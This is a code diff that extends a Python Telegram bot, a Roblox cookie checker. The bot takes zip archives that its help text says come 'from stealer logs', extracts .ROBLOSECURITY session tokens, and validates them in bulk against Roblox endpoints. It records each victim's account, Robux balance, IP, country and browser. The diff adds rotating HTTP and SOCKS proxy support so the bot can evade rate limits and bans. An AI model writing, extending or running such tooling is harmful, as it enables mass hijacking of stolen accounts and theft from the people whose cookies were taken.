@@ -1,13 +1,189 @@
 import asyncio
 import aiohttp
+import aiohttp_socks
 import telebot
 import time
 import threading
 import re
 import os
+import zipfile
+import io
+import random
 from config import BOT_TOKEN, OWNER_ID
 
 bot = telebot.TeleBot(BOT_TOKEN)
+
+# ─── Proxy Rotator ────────────────────────────────────────────────────
+class ProxyRotator:
+    """Thread-safe proxy rotator supporting all proxy formats."""
+    
+    def __init__(self):
+        self.proxies = []        # list of proxy dicts for aiohttp
+        self.proxy_raw = []      # list of raw proxy strings
+        self.index = 0
+        self._lock = threading.Lock()
+        self.dead_proxies = set()
+        self.enabled = False
+
+    def load_from_text(self, text):
+        """Parse proxy list from text. Supports all formats:
+        
+        Formats supported:
+        - ip:port
+        - ip:port:user:pass
+        - user:pass@ip:port
+        - http://ip:port
+        - http://user:pass@ip:port
+        - https://ip:port
+        - https://user:pass@ip:port
+        - socks4://ip:port
+        - socks4://user:pass@ip:port
+        - socks5://ip:port
+        - socks5://user:pass@ip:port
+        """
+        self.proxies = []
+        self.proxy_raw = []
+        self.dead_proxies = set()
+        self.index = 0
+
+        for line in text.splitlines():
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            proxy = self._parse_proxy(line)
+            if proxy:
+                self.proxies.append(proxy)
+                self.proxy_raw.append(line)
+
+        if self.proxies:
+            self.enabled = True
+
+    def _parse_proxy(self, line):
+        """Parse a single proxy line into aiohttp-compatible format."""
+        try:
+            # Already has scheme
+            if "://" in line:
+                return self._parse_with_scheme(line)
+            
+            # ip:port:user:pass format
+            parts = line.split(":")
+            if len(parts) == 4:
+                ip, port, user, pwd = parts
+                return {
+                    "scheme": "http",
+                    "host": ip,
+                    "port": int(port),
+                    "username": user,
+                    "password": pwd,
+                    "url": f"http://{user}:{pwd}@{ip}:{port}",
+                    "raw": line,
+                }
+            
+            # ip:port format
+            if len(parts) == 2:
+                ip, port = parts
+                return {
+                    "scheme": "http",
+                    "host": ip,
+                    "port": int(port),
+                    "username": None,
+                    "password": None,
+                    "url": f"http://{ip}:{port}",
+                    "raw": line,
+                }
+            
+            # user:pass@ip:port format
+            if "@" in line:
+                auth_part, host_part = line.rsplit("@", 1)
+                user, pwd = auth_part.split(":", 1)
+                ip, port = host_part.split(":")
+                return {
+                    "scheme": "http",
+                    "host": ip,
+                    "port": int(port),
+                    "username": user,
+                    "password": pwd,
+                    "url": f"http://{user}:{pwd}@{ip}:{port}",
+                    "raw": line,
+                }
+        except Exception:
+            pass
+        return None
+
+    def _parse_with_scheme(self, line):
+        """Parse proxy with scheme (http://, https://, socks4://, socks5://)."""
+        scheme, rest = line.split("://", 1)
+        scheme = scheme.lower()
+        
+        if scheme not in ("http", "https", "socks4", "socks5"):
+            return None
+
+        # Has auth: user:pass@host:port
+        if "@" in rest:
+            auth_part, host_part = rest.rsplit("@", 1)
+            user, pwd = auth_part.split(":", 1)
+            ip, port = host_part.split(":")
+            return {
+                "scheme": scheme,
+                "host": ip,
+                "port": int(port),
+                "username": user,
+                "password": pwd,
+                "url": f"{scheme}://{user}:{pwd}@{ip}:{port}",
+                "raw": line,
+            }
+        else:
+            # No auth: host:port
+            ip, port = rest.split(":")
+            return {
+                "scheme": scheme,
+                "host": ip,
+                "port": int(port),
+                "username": None,
+                "password": None,
+                "url": f"{scheme}://{ip}:{port}",
+                "raw": line,
+            }
+
+    def get_next(self):
+        """Get next proxy with rotation. Returns proxy dict or None."""
+        if not self.enabled or not self.proxies:
+            return None
+        
+        with self._lock:
+            if not self.proxies:
+                return None
+            
+            # Try to find a non-dead proxy
+            attempts = 0
+            while attempts < len(self.proxies):
+                proxy = self.proxies[self.index % len(self.proxies)]
+                self.index += 1
+                if proxy["raw"] not in self.dead_proxies:
+                    return proxy
+                attempts += 1
+            
+            # All proxies dead, reset and return random
+            self.dead_proxies.clear()
+            return random.choice(self.proxies) if self.proxies else None
+
+    def mark_dead(self, proxy):
+        """Mark a proxy as dead/banned."""
+        if proxy:
+            with self._lock:
+                self.dead_proxies.add(proxy["raw"])
+                # If more than 80% proxies are dead, reset
+                if len(self.dead_proxies) > len(self.proxies) * 0.8:
+                    self.dead_proxies.clear()
+
+    def count(self):
+        """Return total and alive proxy count."""
+        with self._lock:
+            total = len(self.proxies)
+            dead = len(self.dead_proxies)
+            return total, total - dead
+
+proxy_rotator = ProxyRotator()
 
 # ─── Stats ────────────────────────────────────────────────────────────
 class CheckerStats:
@@ -21,9 +197,9 @@ class CheckerStats:
         self.no_cookie = 0
         self.checked = 0
         self.start_time = None
-        self.hits_list = []       # list of (username, user_id, robux, ip, country, browser)
-        self.high_robux = []      # users with high robux value (>=1000)
-        self.all_robux = 0        # total robux across all hits
+        self.hits_list = []
+        self.high_robux = []
+        self.all_robux = 0
         self._lock = threading.Lock()
 
     def add_hit(self, username, user_id, robux, ip, country, browser):
@@ -69,8 +245,6 @@ def format_elapsed(seconds):
     return f"{h:02d}:{m:02d}:{s:02d}"
 
 # ─── Parse filename for metadata ──────────────────────────────────────
-# Format: link1_0064_BD_103.16.226.178_27_04_2026__Cookies__Google_Chrome_Default.txt
-# or:     link1_2162_AR__138.117.76.246__Cookies__Google_Chrome_Default.txt
 def parse_filename(filename):
     """Extract country, IP, browser from cookie filename."""
     base = os.path.splitext(filename)[0]
@@ -78,44 +252,85 @@ def parse_filename(filename):
     info_part = parts[0] if len(parts) >= 1 else base
     browser_part = parts[1] if len(parts) >= 2 else "Unknown"
 
-    # Parse browser
-    browser = browser_part.replace("_", " ").strip()
-    if not browser:
-        browser = "Unknown"
+    browser = browser_part.replace("_", " ").strip() or "Unknown"
 
-    # Parse country and IP using regex
-    # Match patterns like: BD_103.16.226.178_27_04_2026 or AR__138.117.76.246__
     country = "??"
     ip = "?.?.?.?"
 
-    # Find country code (2 uppercase letters)
     country_match = re.search(r'_([A-Z]{2})_', info_part)
     if country_match:
         country = country_match.group(1)
 
-    # Find IP address (standard IPv4 format: xxx.xxx.xxx.xxx where each octet is 1-3 digits)
-    # IP can be followed by underscore, end of string, or double underscore
     ip_match = re.search(r'_+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:_|$)', info_part)
     if ip_match:
         ip = ip_match.group(1)
 
     return country, ip, browser
 
-# ─── Parse Netscape cookie file and extract .ROBLOSECURITY ────────────
+# ─── Fast cookie extraction ───────────────────────────────────────────
 def extract_roblosecurity(content):
-    """Parse a Netscape cookie file and extract the .ROBLOSECURITY cookie value."""
+    """Fast extraction of .ROBLOSECURITY from Netscape cookie file content."""
     for line in content.splitlines():
-        line = line.strip()
         if line.startswith("#") or not line:
             continue
-        # Netscape format: domain \t include_subdomains \t path \t secure \t expiry \t name \t value
         parts = line.split("\t")
-        if len(parts) >= 7:
-            name = parts[5].strip()
-            value = parts[6].strip()
-            if name == ".ROBLOSECURITY":
-                return value
+        if len(parts) >= 7 and parts[5].strip() == ".ROBLOSECURITY":
+            return parts[6].strip()
     return None
+
+def fast_extract_roblosecurity(content):
+    """Ultra-fast extraction using string search before full parsing."""
+    # Quick check: if .ROBLOSECURITY isn't in the content, skip immediately
+    if ".ROBLOSECURITY" not in content:
+        return None
+    return extract_roblosecurity(content)
+
+def process_upload(file_content, filename):
+    """Process an uploaded file and return list of (roblosecurity, country, ip, browser, filename).
+    
+    Supports:
+    - .zip containing cookie .txt files (fast parallel extraction)
+    - .txt with one cookie per line (plain format)
+    - .txt in Netscape cookie format
+    """
+    cookie_entries = []
+    
+    if filename.endswith('.zip'):
+        try:
+            with zipfile.ZipFile(io.BytesIO(file_content), 'r') as zf:
+                # Filter valid txt files first
+                txt_files = [n for n in zf.namelist() 
+                            if n.endswith('.txt') and not n.startswith('__MACOSX')]
+                
+                # Read all files at once for speed
+                for name in txt_files:
+                    try:
+                        content = zf.read(name).decode('utf-8', errors='ignore')
+                        basename = os.path.basename(name)
+                        country, ip, browser = parse_filename(basename)
+                        roblosecurity = fast_extract_roblosecurity(content)
+                        if roblosecurity:
+                            cookie_entries.append((roblosecurity, country, ip, browser, basename))
+                        else:
+                            # Track no-cookie files in stats later
+                            pass
+                    except Exception:
+                        continue
+        except zipfile.BadZipFile:
+            pass
+    else:
+        content = file_content.decode('utf-8', errors='ignore')
+        roblosecurity = fast_extract_roblosecurity(content)
+        if roblosecurity:
+            country, ip, browser = parse_filename(filename)
+            cookie_entries.append((roblosecurity, country, ip, browser, filename))
+        else:
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    cookie_entries.append((line, "??", "?.?.?.?", "Direct", "manual"))
+    
+    return cookie_entries
 
 # ─── Progress message builder ─────────────────────────────────────────
 def build_progress_text():
@@ -127,6 +342,11 @@ def build_progress_text():
     else:
         hits_text = "  None yet\n"
 
+    proxy_info = ""
+    if proxy_rotator.enabled:
+        total_p, alive_p = proxy_rotator.count()
+        proxy_info = f"🌐 Proxy: {alive_p}/{total_p}\n"
+
     return (
         f"⚡️ CHECKING ⚡️\n"
         f"━━━━━━━━━━━━━━━━━\n"
@@ -136,6 +356,7 @@ def build_progress_text():
         f"❌ Dead: {stats.dead}\n"
         f"🚫 No Cookie: {stats.no_cookie}\n"
         f"📝 Checked: {stats.checked}/{stats.total}\n"
+        f"{proxy_info}"
         f"━━━━━━━━━━━━━━━━━\n"
         f"⏱️ Time: {format_elapsed(elapsed)}\n"
         f"━━━━━━━━━━━━━━━━━\n"
@@ -145,31 +366,63 @@ def build_progress_text():
         f"💎 high robux value user: {len(stats.high_robux)}"
     )
 
-# ─── Async Cookie Validator ───────────────────────────────────────────
+# ─── Async Cookie Validator with Proxy ────────────────────────────────
 ROBLOX_AUTH_URL = "https://www.roblox.com/mobileapi/userinfo"
 ROBLOX_CURRENCY_URL = "https://economy.roblox.com/v1/users/{}/currency"
 
-CONCURRENCY = 30  # concurrent requests for speed
+CONCURRENCY = 50  # higher concurrency for speed
 
-async def validate_cookie(session, roblosecurity):
-    """Validate a .ROBLOSECURITY cookie. Returns (valid, username, user_id, robux) or (False, None, None, 0)."""
+def get_proxy_connector():
+    """Create an aiohttp connector with proxy if available."""
+    proxy = proxy_rotator.get_next()
+    if not proxy:
+        return None, None
+    
+    if proxy["scheme"] in ("socks4", "socks5"):
+        # Use aiohttp_socks for SOCKS proxies
+        if proxy["username"]:
+            proxy_url = f"{proxy['scheme']}://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
+        else:
+            proxy_url = f"{proxy['scheme']}://{proxy['host']}:{proxy['port']}"
+        connector = aiohttp_socks.ProxyConnector.from_url(proxy_url)
+        return connector, proxy
+    else:
+        # HTTP/HTTPS proxies use proxy parameter on request
+        return None, proxy
+
+async def validate_cookie(session, roblosecurity, use_proxy=True):
+    """Validate a .ROBLOSECURITY cookie with proxy rotation."""
+    proxy = None
+    proxy_url = None
+    
+    if use_proxy and proxy_rotator.enabled:
+        proxy = proxy_rotator.get_next()
+        if proxy:
+            proxy_url = proxy["url"]
+
     try:
         headers = {"Cookie": f".ROBLOSECURITY={roblosecurity}"}
-        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+        kwargs = {"headers": headers, "timeout": aiohttp.ClientTimeout(total=10)}
+        if proxy_url and proxy and proxy["scheme"] in ("http", "https"):
+            kwargs["proxy"] = proxy_url
+
+        async with session.get(ROBLOX_AUTH_URL, **kwargs) as resp:
             if resp.status != 200:
+                if resp.status in (403, 429) and proxy:
+                    proxy_rotator.mark_dead(proxy)
                 return (False, None, None, 0)
             data = await resp.json(content_type=None)
             if "UserID" not in data:
                 return (False, None, None, 0)
             user_id = data["UserID"]
             username = data.get("UserName", data.get("Username", f"User{user_id}"))
-            # Get robux — only if cookie is valid
             robux = 0
             try:
+                curr_kwargs = {"headers": headers, "timeout": aiohttp.ClientTimeout(total=8)}
+                if proxy_url and proxy and proxy["scheme"] in ("http", "https"):
+                    curr_kwargs["proxy"] = proxy_url
                 async with session.get(
-                    ROBLOX_CURRENCY_URL.format(user_id),
-                    headers=headers,
-                    timeout=aiohttp.ClientTimeout(total=8)
+                    ROBLOX_CURRENCY_URL.format(user_id), **curr_kwargs
                 ) as currency_resp:
                     if currency_resp.status == 200:
                         cdata = await currency_resp.json(content_type=None)
@@ -177,26 +430,57 @@ async def validate_cookie(session, roblosecurity):
             except Exception:
                 pass
             return (True, username, user_id, robux)
+    except (aiohttp.ClientProxyConnectionError, aiohttp_socks.ProxyConnectionError, 
+            aiohttp.ClientHttpProxyError, ConnectionError):
+        if proxy:
+            proxy_rotator.mark_dead(proxy)
+        return (False, None, None, 0)
     except Exception:
         return (False, None, None, 0)
 
 async def run_checker(chat_id, progress_msg, cookie_entries):
-    """Run the checker with concurrency and live progress updates.
-    
-    cookie_entries: list of (roblosecurity_value, country, ip, browser, filename)
-    """
+    """Run the checker with concurrency, proxy rotation, and live progress updates."""
     stats.reset()
     stats.total = len(cookie_entries)
     stats.start_time = time.time()
 
-    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY)
+    # Create connector based on proxy type
+    connector_kwargs = {"limit": CONCURRENCY, "limit_per_host": 0}  # no per-host limit with proxies
+    
+    # If using SOCKS proxies, we need a different approach
+    if proxy_rotator.enabled and any(p["scheme"] in ("socks4", "socks5") for p in proxy_rotator.proxies):
+        # For SOCKS: create individual sessions per request with connector
+        connector = aiohttp.TCPConnector(**connector_kwargs)
+    else:
+        connector = aiohttp.TCPConnector(**connector_kwargs)
+
     async with aiohttp.ClientSession(connector=connector) as session:
         sem = asyncio.Semaphore(CONCURRENCY)
 
         async def check_one(entry):
             roblosecurity, country, ip, browser, filename = entry
             async with sem:
-                result = await validate_cookie(session, roblosecurity)
+                # For SOCKS proxies, we need to create per-request sessions
+                if proxy_rotator.enabled and any(p["scheme"] in ("socks4", "socks5") for p in proxy_rotator.proxies):
+                    proxy = proxy_rotator.get_next()
+                    if proxy and proxy["scheme"] in ("socks4", "socks5"):
+                        if proxy["username"]:
+                            proxy_url = f"{proxy['scheme']}://{proxy['username']}:{proxy['password']}@{proxy['host']}:{proxy['port']}"
+                        else:
+                            proxy_url = f"{proxy['scheme']}://{proxy['host']}:{proxy['port']}"
+                        try:
+                            sock_connector = aiohttp_socks.ProxyConnector.from_url(proxy_url)
+                            async with aiohttp.ClientSession(connector=sock_connector) as sock_session:
+                                result = await _validate_with_session(sock_session, roblosecurity, proxy)
+                        except Exception:
+                            if proxy:
+                                proxy_rotator.mark_dead(proxy)
+                            result = (False, None, None, 0)
+                    else:
+                        result = await validate_cookie(session, roblosecurity)
+                else:
+                    result = await validate_cookie(session, roblosecurity)
+                
                 if result[0]:
                     stats.add_hit(result[1], result[2], result[3], ip, country, browser)
                 else:
@@ -205,7 +489,6 @@ async def run_checker(chat_id, progress_msg, cookie_entries):
 
         tasks = [check_one(e) for e in cookie_entries]
 
-        # Progress updater — updates the Telegram message every 2 seconds
         async def progress_updater():
             while stats.checked < stats.total:
                 await asyncio.sleep(2)
@@ -223,7 +506,6 @@ async def run_checker(chat_id, progress_msg, cookie_entries):
         await asyncio.gather(*tasks)
         updater_task.cancel()
 
-    # Final update
     try:
         bot.edit_message_text(
             build_progress_text(),
@@ -234,7 +516,6 @@ async def run_checker(chat_id, progress_msg, cookie_entries):
     except Exception:
         pass
 
-    # Send detailed hits
     if stats.hits_list:
         hits_detail = "💎 *HITS DETAILS:*\n━━━━━━━━━━━━━━━━━\n"
         for username, user_id, robux, ip, country, browser in stats.hits_list:
@@ -245,12 +526,15 @@ async def run_checker(chat_id, progress_msg, cookie_entries):
         try:
             bot.send_message(chat_id, hits_detail, parse_mode="Markdown")
         except Exception:
-            # Split if too long
             chunks = [hits_detail[i:i+4000] for i in range(0, len(hits_detail), 4000)]
             for chunk in chunks:
                 bot.send_message(chat_id, chunk)
 
-    # Send completion message
+    proxy_status = ""
+    if proxy_rotator.enabled:
+        total_p, alive_p = proxy_rotator.count()
+        proxy_status = f"🌐 Proxy Alive: {alive_p}/{total_p}\n"
+
     bot.send_message(
         chat_id,
         f"✅ *Checking Complete!*\n"
@@ -260,59 +544,45 @@ async def run_checker(chat_id, progress_msg, cookie_entries):
         f"❌ Dead: {stats.dead}\n"
         f"🚫 No Cookie: {stats.no_cookie}\n"
         f"🔥 All Robux: {stats.all_robux}\n"
+        f"{proxy_status}"
         f"⏱️ Time: {format_elapsed(stats.elapsed())}",
         parse_mode="Markdown"
     )
 
-# ─── Process uploaded file (zip or txt) ───────────────────────────────
-def process_upload(file_content, filename):
-    """Process an uploaded file and return list of (roblosecurity, country, ip, browser, filename).
-    
-    Supports:
-    - .zip containing cookie .txt files
-    - .txt with one cookie per line (plain format)
-    - .txt in Netscape cookie format
-    """
-    import zipfile
-    import io
-    
-    cookie_entries = []
-    
-    # Check if it's a zip file
-    if filename.endswith('.zip'):
-        zip_buffer = io.BytesIO(file_content)
-        try:
-            with zipfile.ZipFile(zip_buffer, 'r') as zf:
-                for name in zf.namelist():
-                    if name.endswith('.txt') and not name.startswith('__MACOSX'):
-                        try:
-                            content = zf.read(name).decode('utf-8', errors='ignore')
-                            basename = os.path.basename(name)
-                            country, ip, browser = parse_filename(basename)
-                            roblosecurity = extract_roblosecurity(content)
-                            if roblosecurity:
-                                cookie_entries.append((roblosecurity, country, ip, browser, basename))
-                        except Exception:
-                            continue
-        except zipfile.BadZipFile:
-            pass
-    else:
-        # Plain .txt file
-        content = file_content.decode('utf-8', errors='ignore')
-        
-        # Try Netscape format first
-        roblosecurity = extract_roblosecurity(content)
-        if roblosecurity:
-            country, ip, browser = parse_filename(filename)
-            cookie_entries.append((roblosecurity, country, ip, browser, filename))
-        else:
-            # Plain format: one cookie per line
-            for line in content.splitlines():
-                line = line.strip()
-                if line and not line.startswith("#"):
-                    cookie_entries.append((line, "??", "?.?.?.?", "Direct", "manual"))
-    
-    return cookie_entries
+async def _validate_with_session(session, roblosecurity, proxy=None):
+    """Validate cookie using a specific session (for SOCKS proxies)."""
+    try:
+        headers = {"Cookie": f".ROBLOSECURITY={roblosecurity}"}
+        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
+            if resp.status != 200:
+                if resp.status in (403, 429) and proxy:
+                    proxy_rotator.mark_dead(proxy)
+                return (False, None, None, 0)
+            data = await resp.json(content_type=None)
+            if "UserID" not in data:
+                return (False, None, None, 0)
+            user_id = data["UserID"]
+            username = data.get("UserName", data.get("Username", f"User{user_id}"))
+            robux = 0
+            try:
+                async with session.get(
+                    ROBLOX_CURRENCY_URL.format(user_id),
+                    headers=headers,
+                    timeout=aiohttp.ClientTimeout(total=8)
+                ) as currency_resp:
+                    if currency_resp.status == 200:
+                        cdata = await currency_resp.json(content_type=None)
+                        robux = cdata.get("robux", 0)
+            except Exception:
+                pass
+            return (True, username, user_id, robux)
+    except (aiohttp.ClientProxyConnectionError, aiohttp_socks.ProxyConnectionError,
+            aiohttp.ClientHttpProxyError, ConnectionError):
+        if proxy:
+            proxy_rotator.mark_dead(proxy)
+        return (False, None, None, 0)
+    except Exception:
+        return (False, None, None, 0)
 
 # ─── Bot Commands ──────────────────────────────────────────────────────
 
@@ -329,16 +599,25 @@ def handle_start(message):
 @bot.message_handler(commands=["menu"])
 @owner_only
 def handle_menu(message):
+    proxy_status = "✅ Loaded" if proxy_rotator.enabled else "❌ No proxy"
+    if proxy_rotator.enabled:
+        total_p, alive_p = proxy_rotator.count()
+        proxy_status = f"✅ {alive_p}/{total_p} alive"
+
     bot.reply_to(
         message,
-        "⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
-        "━━━━━━━━━━━━━━━━━\n\n"
-        "🔥 /check - Check cookies from a .zip or .txt file\n"
-        "📊 /stats - View current checker stats\n"
-        "❓ /help - How to use the bot\n"
-        "📋 /menu - Show this menu\n\n"
-        "━━━━━━━━━━━━━━━━━\n"
-        "🤖 Powered by NinjaTech",
+        f"⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
+        f"━━━━━━━━━━━━━━━━━\n\n"
+        f"🔥 /check - Check cookies from .zip or .txt\n"
+        f"🌐 /proxy - Load proxy list (file or GitHub URL)\n"
+        f"📊 /stats - View current checker stats\n"
+        f"🗑️ /proxyclear - Clear all proxies\n"
+        f"❓ /help - How to use the bot\n"
+        f"📋 /menu - Show this menu\n\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"🌐 Proxy: {proxy_status}\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"🤖 Powered by NinjaTech",
         parse_mode="Markdown"
     )
 
@@ -348,20 +627,106 @@ def handle_help(message):
     bot.reply_to(
         message,
         "⚡️ *Cookie Checker Help* ⚡️\n\n"
-        "1️⃣ Send /check with a .zip or .txt file attached\n"
-        "2️⃣ .zip should contain cookie .txt files (Netscape format)\n"
-        "3️⃣ .txt can be Netscape cookie format or plain cookies (one per line)\n"
-        "4️⃣ The bot extracts .ROBLOSECURITY and validates each\n"
-        "5️⃣ Live progress is shown during checking\n"
-        "6️⃣ After completion, hit details are displayed\n\n"
-        "💡 Supports cookie files from stealer logs",
+        "🔥 *Checking Cookies:*\n"
+        "1️⃣ Send /check with a .zip or .txt file\n"
+        "2️⃣ .zip = cookie files from stealer logs\n"
+        "3️⃣ .txt = plain cookies (one per line) or Netscape format\n"
+        "4️⃣ Live progress shown during checking\n\n"
+        "🌐 *Proxy Setup:*\n"
+        "1️⃣ /proxy with a .txt file attached (one proxy per line)\n"
+        "2️⃣ /proxy with a GitHub raw URL as caption\n"
+        "3️⃣ Supports: ip:port, ip:port:user:pass, user:pass@ip:port\n"
+        "4️⃣ Supports: http://, https://, socks4://, socks5://\n"
+        "5️⃣ Auto-rotates proxies and removes dead ones\n\n"
+        "💡 Tip: Use proxies to avoid rate limits!",
         parse_mode="Markdown"
     )
+
+@bot.message_handler(commands=["proxy"])
+@owner_only
+def handle_proxy(message):
+    args = message.text.split(maxsplit=1)
+
+    # Option 1: GitHub raw URL in command
+    if len(args) >= 2 and ("github" in args[1].lower() or "raw.githubusercontent" in args[1].lower()):
+        url = args[1].strip()
+        bot.reply_to(message, f"📥 Downloading proxy list from URL...")
+        try:
+            import requests
+            resp = requests.get(url, timeout=15)
+            if resp.status_code == 200:
+                proxy_rotator.load_from_text(resp.text)
+                total_p, alive_p = proxy_rotator.count()
+                bot.reply_to(
+                    message,
+                    f"✅ *Proxies Loaded from URL!*\n"
+                    f"━━━━━━━━━━━━━━━━━\n"
+                    f"📝 Total: {total_p}\n"
+                    f"✅ Valid: {alive_p}\n"
+                    f"🌐 Proxy rotation enabled!",
+                    parse_mode="Markdown"
+                )
+            else:
+                bot.reply_to(message, f"❌ Failed to download: HTTP {resp.status_code}")
+        except Exception as e:
+            bot.reply_to(message, f"❌ Error downloading: {e}")
+        return
+
+    # Option 2: File attached
+    if not message.document:
+        bot.reply_to(
+            message,
+            "❌ Please attach a .txt file with proxies OR provide a GitHub raw URL.\n\n"
+            "Usage:\n"
+            "• `/proxy` with .txt file attached\n"
+            "• `/proxy https://raw.githubusercontent.com/.../proxies.txt`\n\n"
+            "Supported formats:\n"
+            "• `ip:port`\n"
+            "• `ip:port:user:pass`\n"
+            "• `user:pass@ip:port`\n"
+            "• `http://ip:port`\n"
+            "• `http://user:pass@ip:port`\n"
+            "• `https://ip:port`\n"
+            "• `socks4://ip:port`\n"
+            "• `socks5://user:pass@ip:port`",
+            parse_mode="Markdown"
+        )
+        return
+
+    file_info = bot.get_file(message.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    content = downloaded.decode('utf-8', errors='ignore')
+
+    proxy_rotator.load_from_text(content)
+    total_p, alive_p = proxy_rotator.count()
+
+    if total_p == 0:
+        bot.reply_to(message, "❌ No valid proxies found in the file.")
+        return
+
+    bot.reply_to(
+        message,
+        f"✅ *Proxies Loaded!*\n"
+        f"━━━━━━━━━━━━━━━━━\n"
+        f"📝 Total: {total_p}\n"
+        f"✅ Valid: {alive_p}\n"
+        f"🌐 Proxy rotation enabled!",
+        parse_mode="Markdown"
+    )
+
+@bot.message_handler(commands=["proxyclear"])
+@owner_only
+def handle_proxy_clear(message):
+    proxy_rotator.proxies = []
+    proxy_rotator.proxy_raw = []
+    proxy_rotator.dead_proxies = set()
+    proxy_rotator.enabled = False
+    proxy_rotator.index = 0
+    bot.reply_to(message, "🗑️ All proxies cleared. Checking will run without proxy.", parse_mode="Markdown")
 
 @bot.message_handler(commands=["check"])
 @owner_only
 def handle_check(message):
-    # Check if a document is attached
     if not message.document:
         bot.reply_to(message, "❌ Please attach a .zip or .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
         return
@@ -370,30 +735,30 @@ def handle_check(message):
     downloaded = bot.download_file(file_info.file_path)
     filename = message.document.file_name or "unknown.txt"
 
-    # Process the file
     cookie_entries = process_upload(downloaded, filename)
 
     if not cookie_entries:
         bot.reply_to(message, "❌ No .ROBLOSECURITY cookies found in the file.")
         return
 
-    # Send initial progress message
     stats.reset()
     stats.total = len(cookie_entries)
     stats.start_time = time.time()
 
-    no_cookie_count = 0  # files without .ROBLOSECURITY were already filtered
+    proxy_info = ""
+    if proxy_rotator.enabled:
+        total_p, alive_p = proxy_rotator.count()
+        proxy_info = f"\n🌐 Proxy: {alive_p}/{total_p}"
 
     bot.send_message(
         message.chat.id,
         f"📂 *File:* `{filename}`\n"
-        f"🔑 *Cookies found:* {len(cookie_entries)}\n"
+        f"🔑 *Cookies found:* {len(cookie_entries)}{proxy_info}\n"
         f"🚀 Starting check...",
         parse_mode="Markdown"
     )
     progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")
 
-    # Run the async checker in a thread so it doesn't block the bot
     def run_in_thread():
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
